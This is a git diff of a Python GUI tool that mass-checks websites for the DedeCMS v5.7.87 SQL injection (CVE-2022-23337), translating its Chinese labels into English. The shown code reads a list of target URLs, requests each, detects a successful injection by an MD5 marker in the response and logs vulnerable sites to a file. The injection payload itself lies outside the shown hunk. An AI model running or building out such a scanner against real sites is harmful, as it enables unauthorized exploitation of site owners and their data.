@@ -11,22 +11,22 @@ def dede_sql_exp(url):
     try:
         res = requests.get(url, timeout=3)
         if "c4ca4238a0b923820dcc509a6f75849b" in res.text:
-            dedesql_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
+            dedesql_text.insert(END,"[! ! ! ! ! ! ] Vulnerable url:" + url + "\n")
             dedesql_text.see(END)
-            with open ("存在DedeCMSv5.7.87SQL注入漏洞的url.txt", 'a') as f:
+            with open ("[exists]Dede_CVE_2022_23337_url.txt", 'a') as f:
                 f.write(url + "\n")
     except:
-        dedesql_text.insert(END, "【×】不存在漏洞的url：" + url + "\n")
+        dedesql_text.insert(END, "[×]URL without vulnerability:" + url + "\n")
         dedesql_text.see(END)
 def get_dede_addr():
-    with open("修正后的url.txt","r") as f:
+    with open("corrected url.txt","r") as f:
         for address in f.readlines():
             address = address.strip()
             yield address
 def dedesql_gui():
     dedesql = tk.Tk()
     dedesql.geometry("1035x455")
-    dedesql.title("DedeCMS v5.7.87 SQL注入漏洞(CVE-2022-23337)一把梭")
+    dedesql.title("Dede v5.7.87 SQLinjection(CVE-2022-23337) [auto-muti-exp]")
     dedesql.resizable(0, 0)
     logo = PhotoImage(file="./logo.ico")
     dedesql.tk.call('wm', 'iconphoto', dedesql._w, logo)
